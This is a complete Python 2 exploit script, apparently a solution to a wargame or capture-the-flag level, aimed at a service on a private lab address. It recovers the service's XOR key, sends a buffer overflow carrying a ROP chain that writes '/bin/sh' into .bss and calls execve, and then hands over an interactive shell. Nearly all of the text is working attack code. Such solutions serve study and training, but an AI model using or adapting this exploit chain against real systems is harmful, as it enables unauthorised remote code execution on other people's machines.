```py
#!/usr/bin/python
import socket, struct, time, telnetlib

""" PID : 1506 """

QUIT = 'Q'
OPTION = 'E'
BUFFER_SIZE = 131088
BANNER_SIZE_1 = 57
BANNER_SIZE_2 = 120
UNPACK_SIZE = 4


class Solution(object):
    last_buffer = None

    def __init__(self, server='192.168.85.155', sport=20002):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((server, sport))

    def rec(self, sz=1024):
        self.last_buffer = self.s.recv(sz)
        time.sleep(0.5)
        return self

    def rec_all(self, sz=1024):
        self.last_buffer = ''
        while len(self.last_buffer) < sz:
            self.last_buffer += self.s.recv(sz - len(self.last_buffer))
        time.sleep(0.5)
        return self

    def send(self, data):
        self.s.sendall(data)
        time.sleep(0.5)
        return self

    def quit(self):
        self.s.close()
        return self

    def rec_info(self, length=False):
        print ("[+] length: %d " % len(self.last_buffer)) \
            if length else ("[+] received: %s" % self.last_buffer)
        return self

    def shell_code(self):
        p = 'A' * BUFFER_SIZE
        p += self.p(0x080489f0)  # 0x080489f0  snprintf@plt
        p += self.p(0x080499bc)  # 0x080499bc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
        p += self.p(0x0804b420)  # 0x0804b420 - 0x0804b500 is .bss
        p += self.p(0x00000006)  # sprintf size 6
        p += self.p(0x08049d9f)  # %s
        p += self.p(0x08049d78)  # /bin/

        p += self.p(0x080489f0)  # 0x080489f0  snprintf@plt
        p += self.p(0x080499bc)  # 0x080499bc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
        p += self.p(0x0804b425)  # 0x0804b420 - 0x0804b500 is .bss + 5
        p += self.p(0x00000002)  # sprintf size 2
        p += self.p(0x08049d9f)  # %s
        p += self.p(0x0804a158)  # s

        p += self.p(0x080489f0)  # 0x080489f0  snprintf@plt
        p += self.p(0x080499bc)  # 0x080499bc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
        p += self.p(0x0804b426)  # 0x0804b420 - 0x0804b500 is .bss + 6
        p += self.p(0x00000002)  # sprintf size 2
        p += self.p(0x08049d9f)  # %s
        p += self.p(0x0804a09e)  # h

        p += self.p(0x080489b0)  # 0x080489b0  execve@plt
        p += self.p(0xcccccccc)  # exit() filler
        p += self.p(0x0804b420)  # 0x0804b420 - 0x0804b500 is .bss
        p += self.p(0x00000000)  # args
        p += self.p(0x00000000)  # env
        return p

    def interact(self):
        t = telnetlib.Telnet()
        t.sock = self.s
        t.interact()

    @staticmethod
    def u(data):
        return struct.unpack('<I', data)

    @staticmethod
    def p(data):
        return struct.pack('<I', data)

    @staticmethod
    def xor(s1, s2):
        return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))


def main():
    s = Solution()
    p = s.shell_code()
    payload_size = s.p(len(p))

    print '[+] skipping banner, sending op...'
    s.rec_all(BANNER_SIZE_1) \
        .rec_info() \
        .send(OPTION + payload_size + p) \
        .rec_all(BANNER_SIZE_2) \
        .rec_info() \
        .rec(UNPACK_SIZE) \
        .rec_info(True)

    cipher_size = s.u(s.last_buffer)[0]
    print '[+] cipher size: ', cipher_size
    s.rec_all(cipher_size)

    print '[+] size received: ', len(s.last_buffer)
    xor_key = s.xor(p, s.last_buffer)

    print '[+] sending second op...'
    s.send(OPTION + payload_size + s.xor(p, xor_key))
    s.rec()
    time.sleep(0.05)
    s.send(QUIT) \
        .interact()


if __name__ == "__main__":
    main()

```